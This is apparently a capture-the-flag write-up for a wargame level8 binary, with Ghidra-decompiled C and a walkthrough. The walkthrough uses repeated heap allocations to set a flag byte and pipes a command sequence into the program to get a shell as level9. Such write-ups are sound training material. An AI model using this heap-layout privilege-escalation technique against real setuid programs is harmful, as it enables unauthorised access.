<span style="display: flex; justify-content: space-between;"><span style="text-align: left; display: block;">
	[← level7](../level7/solution.md)
</span>
<span style="text-align: center; display: block;">
	[Home](../README.md)
</span>
<span style="text-align: right; display: block;">
	[level9 →](../level9/solution.md)
</span>
</span>

level8
======

Decompilation
-------------

Because the main function is a bit more complex than usual, I used ghidra to decompile it.
The main function looks like this:
```c
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <string.h>

typedef struct	obj
{
	char	*auth;
	char	*service;
}				obj_t;

obj_t			obj;

int				main(void)
{
	char	input_buffer [132];

	while (true) {
		printf("%p, %p \n", obj.auth, obj.service);

		if (!fgets(input_buffer, 128, stdin))
			return 0;

		if (!strncmp(input_buffer, "auth ", 5)) {
			obj.auth = malloc(4);

			*obj.auth = '\0';

			if (strlen(input_buffer + 5) < 30)
				strcpy(obj.auth, input_buffer + 5);
		}

		if (!strncmp(input_buffer, "reset", 5))
			free(obj.auth);

		if (!strncmp(input_buffer, "service", 6))
			obj.service = strdup(input_buffer + 7);

		if (!strncmp(input_buffer, "login", 5)) {
			if (obj.auth[32] == '\0')
				fwrite("Password:\n", 1, 10, stdout);
			else
				system("/bin/sh");
		}
	}
}
```

Exploitation
------------

We need to set the byte at obj.auth[32] to any value other than 0.
If we call service multiple times, we may copy something at this offset.
Service will copy the bytes following the service command, which will be '\n' in our case.

After callig auth followed by service, the memory layout looks like this:
```sh
./level8 <<< $'auth AAAA\nservice'
```
```c
(nil), (nil)
0x93265c0, (nil)
0x93265c0, 0x93265d0
```
|  auth  |      | service |      |
|:------:|:----:|:-------:|:----:|
|  0x00  | 0x04 |   0x10  | 0x14 |
| "AAAA" |      | "\n"    |      |

If we call service a second time we should be able to copy "\n" to obj.auth[32].
```sh
./level8 <<< $'auth \nservice\nservice'
```
```c
(nil), (nil)
0x87305c0, (nil)
0x87305c0, 0x87305d0
0x87305c0, 0x87305e0
```
Indeed, 0x87305e0 - 0x87305c0 = 0x20 = 32.

Let's try to call login:
```sh
(echo -e 'auth \nservice\nservice\nlogin'; cat) | ./level8
```
```
0x804a008, (nil)
0x804a008, 0x804a018
0x804a008, 0x804a028
```

```sh
whoami
```
```
level9
```
